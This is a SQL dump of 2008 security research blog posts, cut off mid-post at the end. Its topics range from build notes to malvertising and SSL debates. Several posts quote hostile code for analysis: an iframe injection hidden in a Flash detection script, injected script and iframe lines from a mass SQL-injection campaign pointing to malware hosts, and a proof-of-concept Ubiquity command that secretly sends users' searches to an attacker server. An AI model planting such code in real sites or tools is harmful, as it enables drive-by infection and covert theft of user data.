INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (611, 'Technical Quickie: Building SpiderMonkey On FreeBSD 6.2 AMD64', 'ThreatLabz', 'November 26, 2008', 'I wanted to get Didier Stevens modified SpiderMonkey Javascript engine compiled and running on a FreeBSD 6.2 AMD64 box. It turns out the config files shipped with his 1.7.0 version do not include FreeBSD support, so I wound up having to hack something together...and I thought I would share what I did in case others are interested. I assume these instructions would be relatively applicable to later FreeBSD versions as well.When you go to build the source, config.mk pulls in an appropriate file in config/ to use for your system. On FreeBSD 6.2 AMD64, the output of \'uname –s\' and \'uname –r\' essentially lead to the config file named \'config/FreeBSD6.2-RELEASE.mk\'. So what I wound up doing was go into the config/ directory and copy the \'Linux-All.mk\' file to \'FreeBSD6.2-RELEASE.mk\'.If we were building on an x86 (32-bit) FreeBSD platform, that might be all we need to do. However, since we\'re building on AMD64 (64-bit), this configuration file needs to be modified because the default Linux configuration file references 64-bit CPU architecture as \'x86_64\'; on FreeBSD AMD64, the CPU architecture is reported as \'amd64\'. Fortunately the fix is simple: just do a find/replace on all values of \'x86_64\' and change them to \'amd64\'. There are three changes total.Now that you\'ve made those changes, you should be all set. Just build the application (\"gmake –f Makefile.ref\") and then grab the \'js\' binary out of the \'FreeBSD6.2-RELEASE_DBG.OBJ/\' directory.Enjoy.- Jeff', 'Analysis', 'https://www.zscaler.com/blogs/research/technical-quickie-building-spidermonkey-freebsd-62-amd64');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (612, 'Hiding Web 2.0 Malware In Plain Sight', 'ThreatLabz', 'November 17, 2008', 'Hello everyone, Jeff Forristal here. I thought I\'d take a moment to discuss a trend we\'re seeing in attacker tactics, and predict how it may evolve into what will become commonplace tomorrow.    Recently we ran across a modified version of Adobe\'s Javascript-based Flash detection script used as part of a drive-by attack on web browsers. Basically the malware writers took the Flash Player Version Detection v1.7 script (AC_RunActiveContent.js) and tweaked it with a malicious payload. The heart of the evilness was caused simply adding one line, towards the end of the script:        document.write(\"<i\"+\"fr\"+\"ame    src=\'http://__someplace__.com/    pdfdoc/index.php?id=com2\'    width=1 height=1></ifr\"+\"am\"+\"e>\");         This causes the script to write out an IFrame tag that pointed to a malware site which then tried to deliver exploits to the browser in an attempt to cause arbitrary code execution.    I\'m willing to speculate that anyone doing a shallow/naive review of the script could prematurely conclude that the script is the proper Adobe Flash detection script and thus dismiss it as non-evil. Hopefully though many investigators would plow through the entire file and eventually see the plain-as-day extra IFrame code added, and thus see through the facade.    However, what if the IFrame code wasn’t easily visible? Javascript \'packers\' (programs that transform the Javascript code into smaller, more concise code) are becoming the norm on the web for slimming down Javascript code and saving some transfer bandwidth. They work by rewriting the code and essentially obfuscate what is going on as a byproduct. This can make it much more difficult to understand what the Javascript code is doing simply by casually perusing it; a simple Javascript \'document.write\' of a malicious IFrame tag may not be so glaringly obvious anymore. And unfortunately, unlike executable (.EXE) packers such as UPX, the Javascript packers are used by many web sites and projects for legitimate reasons...so the mere presence of a packed Javascript file isn\'t an immediate red flag of its malicious intent (i.e. alerting on packed Javascript files is going to result in a lot of false positives).    How does this help attackers? Well, even though alerting on every packed Javascript file is not recommended, packing should still at least raise the suspicion level. An attacker taking their \'evil.js\' file and packing it might obfuscate what evil.js is doing, but the fact that it\'s a packed file of unknown function may still cause people to investigate. Instead, an attacker can extend the previously mentioned tactic of hiding a malicious payload inside a legitimate Javascript library...but this time, pick a library that is commonly distributed in packed form and widely used. For example, we see packed versions of the JQuery Javascript library quite often on many different sites. A clever attacker could take the (unpacked) jquery.js file, insert their malicious code, pack it using the same packer normally seen used with jquery.js, and then deploy it. Anyone encountering this malicious file, at first glance, may consider it to just be the usual packed jquery.js file and ignore it; any automated signatures meant to flag packed Javascript files would, on the surface, not really differentiate between the packed original version and the packed modified version. And any advanced investigation into the file by looking at the code\'s behavior (or \'unpacking\' it via various means) will, at first, just seem to be the standard set of JQuery functionality. Only those who continue to persist past all the obvious signs that the file is a legitimate jquery.js Javascript file would perhaps encounter the maliciousness of this web 2.0 Trojan horse.         Fortunately there is a workable solution to this problem: whitelists of known-good Javascript file hashes. Since the obvious targets are widely-deployed Web 2.0 Javascript libraries (JQuery, Dojo, SWFObject, Prototype, etc.) it would be feasible to construct a whitelist of the true/safe versions of these popular library files. Of course, maintaining a whitelist is a time-consuming effort, especially with new versions of each library coming out so often. And site designers would need to be encouraged to not make any personalizations/modifications directly to these standard library files, lest they trigger the alarms. It would be interesting if such a whitelist was then utilized by browser extensions such as NoScript to know automatically which Javascript files are safe to execute...but vetting the function library is a minor part of the problem since the site still needs to use custom Javascript to access/utilize the library in the first place.    It’s a hard problem still looking for a perfect solution (like many other security problems). Until next time,    - Jeff', 'Analysis', 'https://www.zscaler.com/blogs/research/hiding-web-20-malware-plain-sight');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (613, 'Stepping Through A Mass Web Attack', 'Michael Sutton', 'November 13, 2008', 'A few days ago, Kaspersky reported on yet another mass web attack. Such attacks are quickly becoming a preferred attack vector as they permit mass infection with minimal effort. We\'ve seen this before, and not just once. In fact, it seems to be popular among Chinese hackers and is often used to gather authentication credentials for online games. While it hasn\'t yet been verified, it appears that SQL injection vulnerabilities on vulnerable servers led to the initial infection. All infected servers seem to be running Microsoft ASP pages, a common target for those seeking sites vulnerable to SQL injection.    I\'m fascinated by such attacks as they illustrate the interconnected nature of the web and shatter the myth that you are safe if you stick to browsing reputable sites. Sadly, reputable sites struggle with vulnerabilities on a regular basis. The unfortunate reality is that any site, no matter how big or small, could be infected. In this latest attack, Travelocity was compromised. While vulnerable servers were infected, the true targets of these attacks are the end users which visit the sites. I\'ve been preaching for some time now that we need to shift our focus from servers to browsers. We spend the majority of our security resources locking down servers and put minimal effort into protecting users browsing the web. Attackers have shifted their focus and we must do the same.    Attack Walk-Through    According to Kaspersky, the attack leverages multiple browser vulnerabilities and a variety of sites to host the attack scripts and malicious code. In order to better understand how these attacks succeed, let\'s walk through one such attack scenario which was live at the time this blog was written:    Step 1 - Server Infection    The attack begins by injecting code onto as many vulnerable web servers as possible. This is commonly accomplished via SQL injection. In this specific example, the following code was injected:    <script src=\"http://dbios.org/h.js\">    This code won\'t change the appearance of the page, so a victim has no way of knowing that the so-called reputable page, is actually launching an attack on his browser. A quick Google search illustrates the mass nature of the attack and reveals that many sites are still infected.    Step 2 - Redirects    The initial JavaScript file typically doesn\'t contain the ultimate attack, but rather calls a variety of other scripts from different locations. This may be done in part to obfuscate the attack but is more likely done simply to accommodate multiple vulnerabilities and download sites in order to make the attack more robust and reach as many potential victims as possible. In our case, the following two IFRAMEs are added to the page:    document.write(\"<iframe width=\'20\' height=\'0\' src=\'http://vvexe.com/haha/index.html\'></iframe>\");  document.write(\"<iframe width=\'0\' height=\'0\' src=\'http://www.kenya.com/faq.htm\'></iframe>\");    Kasperky discusses that this latest round targets a variety of vulnerabilities in web browsers and Maromedia Flash Player. In our example, the exploitation is going after a vulnerability in the Snapshot Viewer for Microsoft Access ActiveX control, published on August 12, 2008 and detailed in MS08-041. One of the IFRAMEs contains code which attempts to instantiate the Snapshot Viewer ActiveX control as shown below:    try{var n;  var ll=new ActiveXObject(\"snpvw.Snapshot Viewer Control.1\");}  catch(n){};  finally{if(n!=\"[object Error]\"){document.write(\"(\"<iframe width=50 height=0 src=ff.htm></iframe>\");}}    As can be seen, if the ActiveX control is indeed accessible, the browser then opens yet another IFRAME from http://vvexe.com/haha/ff.htm and this is where the attack actually lies. The writers of this exploit are either not particularly skilled or just lazy as they\'ve simply leveraged an already public exploit line for line and simply changed the target download to http://ip.kanlang.com/haha/down.exe.    Step 4 - Client Infection    The down.exe executable is a Trojan, which goes by various aliases, including Infostealer.Wowcraft. The Trojan serves as a keylogger and is designed to harvest and transmit authentication credentials for World of Warcraft.    Lessons Learned      	Surfing \'reputable sites\' is not guaranteed to prevent infection.  	A server side compromise is often the first step in a client side attack.  	Defense in depth is critical. In this situation, the threat can be mitigated by patch management, network and host based AV and blocking malicious URLs.      Happy surfing!    - michael', 'Compromise', 'https://www.zscaler.com/blogs/research/stepping-through-mass-web-attack');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (614, 'Cloud Services For Analyzing Malware', 'Michael Sutton', 'November 07, 2008', 'Despite continuing promises from software vendors, malware isn\'t going anywhere. Analyzing malware to protect against it and repair the damage that it may have done, is a significant part of the job description for many security professionals. The sheer volume of malware can make dealing with it an overwhelming task. Fortunately, a number of free cloud-based services have emerged to aid in the task of analyzing malware.    I\'ll divide the analysis tools into two categories - Anti-Virus Multi-Scanners and Sandboxes. The former is nothing more than a collection of AV scanners designed to run together analyzing the same file and return the different results for each AV vendor. This can be a very valuable starting point. It is frustrating to spend hours or days conducting deep analysis on a new binary only to find out that AV vendors have already analyzed the same file previously. A quick run through a multi-scanner can help to let you know if you\'re dealing with 0day or yesterday\'s news. Sandboxes on the other hand are emulation environments which perform automated behavioral analysis on a binary file. They allow the binary to execute and emulate the services that it attempts to interact with. Meanwhile, they are recording the activity which is occurring such as file reads/writes, registry access and network traffic.    AV Multi-Scanners    Building your own multi-scanner isn\'t a terribly difficult or expensive challenge. You need to obtain AV SDKs or command line tools from various vendors, develop a wrapper/front-end to simultaneously submit the same malicious code samples to all at the same time and parse/combine the results into a meaningful report. While it may be valuable to put in the effort if you expect to feed a heavy and regular volume of binaries into the multi-scanner, say for a honeypot network, there are free online alternatives if you\'re looking for only occasional analysis. Below is a chart comparing the functionality of a couple of popular (and free) multi-scanners.                        	  		  			   			VirusTotal  			VirScan.org  		  		  			No. of Engines  			34  			39  		  		  			Zip support  			No  			Yes  		  		  			Web Submissions  			Yes  			Yes  		  		  			Email Submissions  			Yes  			No  		  		  			SSL Support  			Yes  			No  		  	          Sandboxes    Sandboxes automate the process of behavioral analysis. They permit a binary to execute in a controlled environment and monitor the activity which occurs. Given that we\'re dealing with malicious code, the binaries will generally attempt to spread, often by scanning for vulnerable hosts. Rather than actually permit malware to spread externally, sandboxes can simulate network responses to allow the binary to continue executing without actually permitting third party infection. If a steady volume of analysis is required you\'ll want to consider commercial products such as those offered by Norman and Sunbelt Software, however, such solutions can be expensive. If you only require periodic analysis, both vendors offer free web based access to their platforms. Anubis, by contrast, is purely a free web based service and does not have a commercial product offering. The chart below compares the functionality of these three cloud based sandboxes:                             	  		  			   			Anubis  			Norman Sandbox  			CWSandbox  		  		  			URL Analysis  			Yes  			No  			No  		  		  			Zip Support  			Yes  			No  			No  		  		  			SSL Support  			Yes  			No  			No  		  		  			Email Results  			Yes  			Yes  			Yes  		  		  			Dependent Binaries  			Yes  			No  			No  		  	          As can be seen, for an entirely free service, Anubis has an impressive feature set. They even encourage the automated of binaries for analysis so the platform can even be integrated into a honeypot network.    It\'s great to see free resources emerging for malware analysis. As mentioned, these free services won\'t meet everyone\'s needs, but if you\'re tasked with securing a network and only occasionally need analysis capabilities, these sites can significantly streamline your efforts.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/cloud-services-analyzing-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (615, 'Trust Two Times Removed', 'ThreatLabz', 'November 07, 2008', 'Hello everyone, Jeff Forristal here. I thought I\'d take a moment to discuss a real-life security incident that I recently reviewed in post-mortem fashion. The plot is simple: while the person was surfing the web, their browser was exploited by a piece of malware targeting a popular browser plugin. However, it\'s the details that make this story a bit intriguing...and scary.\r\n\r\nThe person\'s surfing session was quite normal and not particularly careless. During the moments just before the incident, the person was using Google to find an answer to a technical question. One of the top search results was for a smaller site that hosted technical tidbits of information collected and donated from various information sources. The person clicked through to that site. Now, this site is not a site that would be considered to have a \'risky\' reputation, nor does it harbor any direct malware. It\'s just a normal, basic site that looks to be someone\'s personal project (site was designed in FrontPage 6.0!) to better the world by collecting and publishing useful information. In fact, the only thing questionable about it is the number of syndicated ads on the page: 7, by our count, from multiple vendors (BidVertiser, Google, Clicksor, and FastClick). Of course, it makes sense that they would (over-)populate their page(s) with ads in an attempt to generate revenue from their content publishing efforts. But this turned out to be the problem.\r\n\r\nSee, once the person\'s browser landed on this ad-infested page, the browser started running around like mad to fetch all the syndicated ad content. Each ad syndication attempt usually results in multiple browser requests because the main requests to the ad syndicator often results in a chain of redirects eventually landing at the specific content of the \"advertisee\" utilizing the syndication service. As the term \'syndication\' implies, the ad services are just the middle-man between the web site and the advertisee. And the website is just the middle-man between the ad service and the web surfer.\r\n\r\nAnyways, what eventually happened is that one of the ad syndicators served up an advertisee\'s ad...and it just so happened that the ad was actually a piece of malware that could immediately compromise the vulnerable browser plugin. This is not necessarily new news; attackers have been known for quite a while to leverage advertising syndication as a way to spread their malware. But it\'s a bit scary to witness in action, and the growing amount of advertising syndication utilized by web sites is going to make it a more predominant malware delivery vector. The problem is exacerbated by the fact that the ads are no longer simple graphics; advertising syndicators usually allow their clients (the advertisees) to specify arbitrary HTML. This gives the advertisee cart blanche to use rich media ads that rely on multiple technologies such as DHTML, Javascript, Flash, etc. But this also gives an attacker full access to syndicate any arbitrary piece of malware that could be hosted/served via a normal web page. (Side note: maybe Google is onto something by only using pure text-based ads; the text is very easy to validate and stands practically no chance of harboring a piece of malware...)\r\n\r\nWhat does this all mean? Well, there are a few things. First, all of those vendors who suggest an exploit is partially mitigated by the requirement that a \"user must visit a malicious web page in order to be attacked\" need to change their tune, because advertising syndication is essentially bringing the malicious web pages (via rich media ad capabilities) to the user. Second, the onus is on the advertising syndication services to ensure their clients aren\'t trying to deliver malware ads through the service. That\'s a tall order, and the ad vendors have not exactly been batting 1000. Third, in the age of mashups and syndication, we no longer have a situation where a user has to only decide whether they trust the destination web site or not; they must now trust all the components that are mashed and syndicated into that site, and in turn trust all the components those components use, etc. In the incident I just talked about, we have the person trusting the web site, the web site trusting the advertising services, and the advertising services trusting their clients. Thus we come to having trust two times removed. Worse, web browser do not equip people with the necessary tools to really help them manage this trust chain effectively; it\'s pretty much an all-or-nothing shot based upon the user\'s trust of the immediate target web site. In the meantime, maybe browser plugins like AdBlockPlus and NoScript could help, although that essentially robs legitimate sites of advertising revenue. However, if enough users start to use ad blocking software as a matter of security, perhaps the advertising services will become pickier about their clientele and better scrutinize what they are actually syndicating.\r\n\r\nOnly time will tell, I suppose.\r\n- Jeff\r\n\r\nps. if you are interested in which advertising vendor was the \'enabler\' for the mentioned incident, well, we can not say with 100% certainity. But there does seem to be a popular opinion against one of the vendors.', 'Malware', 'https://www.zscaler.com/blogs/research/trust-two-times-removed');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (616, 'First Encounters With A Web Comment Spammer', 'ThreatLabz', 'October 31, 2008', 'Jeff Forristal here. I run a couple of personal web sites that host the usual gamut of material found on personal web sites (pictures of my kids and family, my latest favorite LOLcat graphic, etc.). Recently I updated one of my sites and added a new comment/contact submission form so I wouldn’t have to expose my email address for spam harvesters to find. A mere few hours after enabling this new comment submission form on my web server, I started to get some comments; unfortunately they were all comment spam.    Of course, web comment spamming has become yet another fact of life on the Internet. Blogs and forums with unmoderated/open comment submission functionality are quickly getting clogged with random and off-topic spam. Basically the spammers are taking the content they would normally send you in email, and now posting it to web site forums and blogs too. This is why comment moderation and CAPTCHAs are becoming the norm for forum and blog comment posting.    Anyways, there is nothing all that exciting about receiving spam of any variety. However the nature of the comment spam I received caught my eye. Over the course of a few weeks, I received multiple comment spams that all had the same format, but different random values.    Two examples of the comment spam I received were:    Email: cdbiib@orhabg.com  Comment:  jJsAdx <a href=\"http://aereogakjvpd.com/\">aereogakjvpd</a>, [url=http://ubfcdpkfggto.com/]ubfcdpkfggto[/url], [link=http://wiogiusmvjcz.com/]wiogiusmvjcz[/link], http://ejmugotxbmqc.com/      Email: thowea@snkkjo.com  Comment:  fHwI3w <a href=\"http://uwtsayqpclib.com/\">uwtsayqpclib</a>, [url=http://wetpnicpwkfd.com/]wetpnicpwkfd[/url], [link=http://bvtyjneqigek.com/]bvtyjneqigek[/link], http://prcghesjscpl.com/    We can make an educated guess that this comment submission isn’t directly about blindly shoving links onto sites in order to bolster incoming link counts (inflating PageRank ratings and aiding in SEO efforts), because all the links are random and don’t reference real sites. There is no practical value in the data itself that was submitted, except as acting as a probe to see what comes out the other side of the submission process. The data contains four different link formats (an actual HTML <A> tag, two flavors of popular bulletin board markup tags, and just a raw URL), and perhaps a fifth if you count the email address too. That makes me believe the end goal was probably to find a way to inject a clickable link of some sort. Had the action been successful, perhaps the same software would have then subsequently tried to inject more meaningful links (back to our SEO theory). Or, perhaps this was just a pre-cursor scouting application compiling a list of URLs known to allow arbitrary link injection (such lists would commonly be paired or sold with spamware/crimeware apps used to inject content onto listed sites already known to be open to receiving the injection).    Of course, being the curious individual that I am, I started to wonder:      	The app managed to put something resembling an email address into the email field. Now, sure, the form field name was ‘email’, so it wouldn’t be that hard to deduce; what would happen if I named that field something less obvious (\'mail\', \'eml\', \'e\', \'foo\')?  	The links were submitted in a textarea field; will it submit the same type of data in a more constrained input text box?  	Will it try to inject content into other identifiably named fields, such as \'phone\', \'address\', \'url\', etc.?  	Does the app support cookies? Is it a well-behaved web user agent? How smart is it?  	Can the app\'s injection logic handle multi-step submissions, where you submit to one page/place and the data eventually appears on a different page/place but not within the actual submission response (think: you submit a comment, you get a page that says \"thank you\", but then have to click one more link before you get to where your comment is actually displayed)?  	And of course, the million dollar question: what would have happened had their injection succeeded and produced a clickable link?      I’m not one to leave such important questions burning on my mind (heh), so I came up with a plan to get the answers I want. I will lay a trap for the comment spammer (or rather, their app). The idea is simple: through the magic of some server-side logic, I will detect when this comment spamming app is making submissions to my forms (assuming they come back in the future; but historically they seem to visit me on a fairly regular basis, so it seems a safe assumption). Rather than display the usual \"thank you for your submission\" response, I’ll instead feed a specially crafted response to make it seem like the submission actually produced a clickable link (making me look vulnerable). Further, I will then flag that session/IP as a spammer, and all subsequent requests will result in some extra forms being added to the web page responses. Those forms will be designed with certain characteristics meant to gauge the effectiveness and operation of the application and its web crawler; I’m assuming the app will repeat its typical injection testing process for as many forms as it encounters.    So if all goes accordingly to plan, I intend to post a follow-up to this aptly titled article in a few weeks. The follow-up will of course be entitled \"Second encounters with a web comment spammer.\"    Until then!  - Jeff', 'Spam', 'https://www.zscaler.com/blogs/research/first-encounters-web-comment-spammer');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (617, 'Ports Are Meaningless', 'Michael Sutton', 'October 28, 2008', 'I read an interesting survey today commissioned by FaceTime Communications. This is their fourth such annual report and while the overall findings were unsurprising, it highlights a growing problem - how to control application use as traffic converges on ports 80 and 443. The survey found that employee use of collaborative Internet applications is on the rise and that employees use such applications for personal benefit on company time - no surprise there. This has in turn led to security, bandwidth utilization, compliance and data leakage issues. Some of the more interesting findings are below:      	97% of employees utilize \'Internet Applications\', defined as IM, P2P, streaming media, collaboration (web conferencing, blogging and social media), VoIP, anonymizers, web mail, etc.  	86% use IM  	54% use file sharing  	69% use VoIP  	15% use anonymizers      These statistics are important as they emphasize the increased use of applications that are often not sanctioned or monitored by internal IT, yet can significantly impact the corporate LAN. The larger the attack surface, the more vulnerable a platform becomes. Installing additional applications to a desktop system increases the likelihood that one such application will be vulnerable and open to attack, especially when these applications are not regularly patched. Moreover, such apps can represent costly bandwidth utilization and potential data leakage risk.    Why is it that the use of non-sanctioned applications is on the rise? Have internal security teams given up the fight and handed over desktop control to end users? No. The reality is that end users no longer need admin rights to utilize alternate applications. Why? Many are now web based. You don\'t need to install a desktop application on your machine, you only need to point your web browser to a Rich Internet Application and any of the aforementioned application categories are readily available online.    What the report did not cover, is what form this traffic takes, how it can be identified and how it can be controlled. A decade ago, network firewalls ruled the security landscape. Preventing access to a particular application/protocol was as simple as blocking a known port. Don\'t want employees to send files? No problem, block outbound port 21. Telnet? That\'s port 23. Today however, ports are meaningless. Traffic is converging on ports 80 and 443 for a simple reason - they\'re always accessible, on any network.    Applications are becoming \'network aware\'. They may have a preference for their communication protocol but they will find a way out and their fallback plan is always the web. Take a look at applications such as Skype, Tor or virtually any modern P2P application. If you bock all other means of egress, you will find traffic being tunneled through port 80. When this occurs, ports become meaningless and sysadmins suddenly have their hands full. Today, security solutions designed to hand control back to administrators must understand the language spoken by applications in order to pick it out within the sea of legitimate web traffic. Moreover, vendors must constantly monitor and update their signatures as the traffic patterns are continually changing in order to bypass known controls. Just as we\'ve accepted the arms race between virus writers and AV vendors, we now have an arms race between those seeking to make applications accessible to all and the enterprises seeking to control them.    - michael', 'Analysis', 'https://www.zscaler.com/blogs/research/ports-are-meaningless');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (618, 'Ubiquity Foreshadows Future Browser Security Challenges', 'Michael Sutton', 'October 21, 2008', 'When I can, I like to investigate emerging open source projects, both to satisfy my curiosity and to gain insight into security challenges to come. I recently stumbled across one such project from Mozilla Labs, known as Ubiquity. The project is described as \"an experiment into connecting the Web with language\". In a nutshell, it is an Firefox extension which extends browser functionality via natural language queries. When a user invokes Ubiquity via a keyboard shortcut, a text box is displayed where the user can input simple queries and the requests/responses can interact directly with the browser. Let\'s look at an example:\r\n\r\nAccess Ubiquity - On my Mac, by default this can be done via Alt-Space\r\n\r\nEnter a command - I type \"map 1600 Pennsylvania Avenue, Washington DC\" as seen in the image to the left. Note that in addition to retrieving a map, in the lower right hand corner of the image there is an \'Insert map in page\' link. Clicking on this will automagically embed an the map into an editable section of the page that you\'re on. This is handy, for example, for embedding maps into webmail messages.\r\n\r\nBig deal. Google Maps has been around for years. Why should I care that a plugin has been built to make it easier to look up maps?\r\n\r\nWhy Ubiquity Changes the Security Landscape\r\n\r\nExtensibility - Anyone can develop Ubiquity commands and it\'s easy to do so. Once a new command has been created, you can deploy it simply by linking to the code on a web page. The Ubiquity extension will recognize the code and prompt users to add the new command. As the Ubiquity user base grows, this certainly streamlines social engineering attacks. While such extensibility is similar to what can be done today with browser extensions, Ubiquity commands can be developed much more quickly and are just as powerful.\r\n\r\nInteraction - The Ubiquity query window isn\'t just a new browser window. Commands have the ability to directly interact with your browser. For example, the built in email command, interacts with your Gmail account (assuming you\'re authenticated) and allows you to query email addresses from your contacts. This is certainly handy and allows for great interactive Ubiquity commands to be built, but could certainly be abused. How about a rogue Ubiquity command which unknowingly forwards your contact list to a spam bot?\r\n\r\nRemote Updates - The authors of new commands can make changes on the fly and the next time the command is called, Ubiquity will use the updated logic. End users do have the ability to accept automatic updates when they first subscribe, but assuming they do, this provides a great Trojan Horse for a less than honest author. They could publish a useful command, wait until it\'s widely deployed and then change the logic. Take for example the evil-search function which I\'ve published, the code for which is below:\r\n\r\nCmdUtils.CreateCommand({\r\nname: \"evil-search\",\r\ndescription: \"Searches Yahoo! (...and let\'s me know what you search for...)\",\r\nhelp: \"Try issuing \"evil aglet\"\",\r\nicon: \"http://www.yahoo.com/favicon.ico\",\r\ntakes: {\"word\": noun_arb_text},\r\nexecute: function( directObj ) {\r\nvar word = directObj.text;\r\nUtils.openUrlInBrowser( \"http://search.yahoo.com/search?p=\" + escape(word) );\r\nUtils.ajaxGet( \"http://localhost/search?p=\" + escape(word) );\r\n},\r\npreview: function( pblock, directObj ) {\r\nvar word = directObj.text;\r\nif (word.length < innerhtml = \"Searches Yahoo! for the provided search term (...and let\'s me know what you search for...).\">\r\n\r\nThis simple Ubiquity command integrates Yahoo! search functionality. When used, the user will be redirected to a web page displaying results for their query. However, behind the scenes, a second AJAX query is made to an attacker controlled server (left as localhost for illustrative purposes). To see this in action, subscribe to the command, run an evil-search query and check the log files on your local server. A command such as this could be used to keep tabs on searches queried by other users. This is a very simple example. With the power offered by Ubiquity, the sky\'s the limit.\r\n\r\nChallenges/Solutions\r\n\r\nTo be fair, this is a beta project and the team fully admits that security issues will need to be addressed. That said, at present they appear to be pursuing two paths to address the security implications.\r\n \r\n\r\n\r\n  ​End User Warnings - When subscribing to a new Ubiquity command, the user is presented with a big, bold warning letting them know (literally) that evil commands could do anything that they want, including steal credit card information. Warnings such as this are in my opinion, useless (I\'m talkin\' to you Vista). Relying on end users to determine is something is safe doesn\'t work as most users don\'t have the skills to make that determination.\r\n\r\n\r\n \r\n\r\nSocial Trust Network - The current Ubiquity warning message indicates a plan to create a Social Trust Network, whereby users will rely others to determine if a command is safe. This doesn\'t fix the problem, it just spreads it out. The approach still relies on users to determine if a feature is safe and given the remote update capabilities of Ubiquity commands, just because a million people agree that a command is safe today, it could be evil tomorrow. If anything, such a network could provide a false sense of security.\r\n\r\nIn my opinion, the only viable way to secure such a system is to inject a review process. Yes, this reduces the openness of the project and yes this isn\'t foolproof but people with security expertise and knowledge of Ubiquity need to be involved and that puts the burden squarely on the shoulders of Mozilla. I liken it to malicious Google gadgets, which Google claims to test for vulnerabilities. In a world of mashup technologies, where functionality, not just content, can be created by anyone, a central authority must take responsibility for protecting end users.\r\n\r\nUbiquity is a great project and I hope that it succeeds. I just hope that better security is implemented before this project goes prime time.\r\n\r\n- michael', 'Analysis', 'https://www.zscaler.com/blogs/research/ubiquity-foreshadows-future-browser-security-challenges');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (619, 'The Obfuscated TCP Project', 'ThreatLabz', 'October 08, 2008', 'Hello, Jeff Forristal here. In my last post I talked about the desire of some folks to use SSL for encryption purposes but forego the authentication components (via the use of self-signed SSL certificates). Overall it’s not a very good idea, since removing authentication from the process renders the benefit of the encryption moot for all but the most trivial (and lazy) threat vectors (passive eavesdropping).  So earlier this week I ran across a mention of the Obfuscated TCP project (a.k.a. ObsTCP), developed by Adam Langley of Google. The project is self-described as:  Obfuscated TCP is a transport layer protocol that adds opportunistic encryption. It\'s designed to hamper and detect large-scale wiretapping and corruption of TCP traffic on the Internet.  This sounds like an ideal potential alternate for all of those who wish for an \'encryption without (expensive public CA certificate-based) authentication\' solution. The ObsTCP idea is simple: use light-weight and fast encryption functions to obfuscate all TCP data streams, in an effort to thwart passive eavesdropping. Processors are fast enough these days that the additional overhead to perform the data obfuscation is negligible. And (from my interpretation of the project’s documentation), the idea isn’t to be cryptographically secure transport and/or replace SSL…it’s just to obfuscate TCP data enough to make passive eavesdropping difficult to do. We are already seeing similar approaches deployed via P2P clients to bypass ISP-based throttling based on packet/protocol inspection; the obfuscation employed isn’t robust to survive a targeted cryptographic attack, but it is enough to make high-speed protocol detection and classification difficult. The project has produced a video (hosted on Youtube) that goes over the basic goals and reasoning behind them.  Looking at the project\'s history, the original intent seems to be for ObsTCP to be added into the TCP/IP protocol stack (ISO layer 4) for transparency. However, apparently the ObsTCP project approached the IETF with a draft, and, ... well ..., it got a chilly reception. So ObsTCP changed gears and instead moved up the stack to the application layer (ISO layer 7), and is now focusing on HTTP as their first high-value protocol target. So the original project description of ObsTCP being a \"transport layer protocol\" is a bit misleading when considered in the context of the project\'s new implementation direction.  So how does ObsTCP work? Well, it requires an ObsTCP-capable client and server. The server admin essentially embeds the server\'s public key (and some meta information) in a DNS entry related to the server. The client retrieves the server\'s public key, opens a connection to the ObsTCP port of the server, and then uses a Diffie-Helman authentication exchange to negotiate a key to use for subsequent encryption. Right now the project is offering proof-of-concept patches for Firefox browser, and Apache and lighttpd web servers to make them ObsTCP-capable. They also offer an ObsTCP-to-normal-TCP proxy which can be placed in front of TCP services to make them ObsTCP-capable.  Overall, how does ObsTCP compare against the threat vectors previously listed in my \"SSL encryption without authentication debate\" post? We already mentioned that passive eavesdropping would be thwarted, as that\'s the purpose of ObsTCP to begin with. But what about a more active man-in-the-middle (MitM) attack? My cursory review of the ObsTCP documentation and design indicates that it does not directly mitigate that specific threat vector—however, it does make it harder for an attacker to pull off. This is because the server\'s public key is distributed via DNS, separate from the TCP connection. That means an attacker has to intercept both DNS request and the TCP connection in order to successfully pull of a MitM attack. Further, the DNS records can be cached at various points around the Internet, making it further difficult for the attacker to spoof a DNS response. The attacker would likely have to employ separate specific DNS attacks (such as the recent Kaminsky brouhaha) just to inject the right info into DNS in order for the TCP intercept/MitM to correctly work. The amount of effort and coordination to pull this off is far greater than a single TCP intercept/MitM attack by itself.  Overall the ObsTCP project is in alpha stages, but the idea is intriguing. It does seem to fill a need that is growing and becoming more vocalized (i.e. encryption without authentication). It will be interesting to see whether the project becomes adopted enough to start gaining public traction and attention. We figure it will be the usual circular catch-22 situation often encountered with new Internet technology: server admins forego deploying the technology because not enough clients support it, and clients forego implementing the technology because not enough servers support it. Oh well, it’s still a good idea.  - Jeff', 'Data Breach;Encryption', 'https://www.zscaler.com/blogs/research/obfuscated-tcp-project');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (620, 'The ‘SSL Encryption Without Authentication’ Debate', 'ThreatLabz', 'October 03, 2008', 'Every so often I encounter a debate where an individual is making a case for the value of supporting/accepting self-signed SSL certificates in browsers. Basically their argument is “I do not care about authentication of SSL, I just want the encryption part…so why should I have to pay VeriSign or another commercial CA all that money for an SSL certificate that verifies my identity?” This question seems to be newly fueled by the fact that Firefox 3 now requires the user to go through a laborious 4-step process to allow the browser to connect to an SSL site utilizing a self-signed certificate.\r\n\r\nThe problem is: anyone who asks the above question is ignoring how SSL works and how SSL employs encryption in the first place. If you are trying to keep an evil person from learning your secrets, but you do not authenticate who you are talking to, you are basically overlooking that you may well be telling your secrets to the evil person directly! If you don’t authenticate the identity of someone, they are essentially an unidentified stranger to you. And the idea of wanting to keep your secrets from strangers (i.e. encryption) but also be willing to give your secrets to strangers (i.e. no authentication) is contradictory. If you have no idea of who you are talking to, 